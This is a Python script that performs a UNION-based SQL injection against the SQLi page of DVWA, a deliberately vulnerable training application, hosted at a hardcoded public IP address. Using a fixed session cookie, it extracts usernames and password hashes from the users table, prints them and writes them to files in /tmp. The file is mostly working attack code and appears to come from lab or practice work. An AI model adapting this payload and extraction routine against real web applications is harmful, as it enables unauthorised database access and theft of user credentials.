
import requests
import re

# Create session and set cookies
session = requests.Session()
session.cookies.set('PHPSESSID', 'u1sbabk40idi42696eoie42qk7')
session.cookies.set('security', 'low')

url_base = "http://31.97.117.123"
sqli_url = f"{url_base}/vulnerabilities/sqli/"

print("[*] Extracting user data with password hashes from DVWA...\n")

# The query returns: first_name, last_name (2 columns)
# We need to UNION with: user, password (2 columns)

# Payload to extract all users with their usernames and password hashes
payload = "999' UNION SELECT user, password FROM users -- -"

print(f"[*] Sending SQL Injection payload...")
print(f"[*] Payload: {payload}\n")

try:
    response = session.get(sqli_url, params={'id': payload, 'Submit': 'Submit'}, timeout=10)
    
    # Extract all user data
    # Looking for pattern: ID: xxx<br />First name: xxx<br />Surname: xxx
    pattern = r'ID:&nbsp;([^<]*?)<br\s*/?>First&nbsp;name:&nbsp;([^<]*?)<br\s*/?>Surname:&nbsp;([^<]*?)<'
    matches = re.findall(pattern, response.text, re.IGNORECASE)
    
    if matches:
        print("[+] SUCCESSFULLY EXTRACTED USER DATA WITH PASSWORD HASHES!\n")
        print("=" * 80)
        print(f"{'ID':<5} | {'USERNAME':<20} | {'PASSWORD HASH':<50}")
        print("=" * 80)
        for id_val, username, password_hash in matches:
            print(f"{id_val:<5} | {username:<20} | {password_hash:<50}")
        print("=" * 80)
        
        # Save to file
        with open('/tmp/extracted_users.txt', 'w') as f:
            f.write("EXTRACTED USER DATA WITH PASSWORD HASHES\n")
            f.write("=" * 80 + "\n")
            f.write(f"{'ID':<5} | {'USERNAME':<20} | {'PASSWORD HASH':<50}\n")
            f.write("=" * 80 + "\n")
            for id_val, username, password_hash in matches:
                f.write(f"{id_val:<5} | {username:<20} | {password_hash:<50}\n")
        
        print("\n[+] Data saved to /tmp/extracted_users.txt")
    else:
        print("[-] No user data found in response")
        print("\n[*] Full response snippet:")
        # Find and print the vulnerable area
        vuln_area = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
        if vuln_area:
            print(vuln_area.group(1)[:500])
    
    # Save full response for debugging
    with open('/tmp/extraction_response.html', 'w') as f:
        f.write(response.text)
    
except Exception as e:
    print(f"[-] Error: {e}")

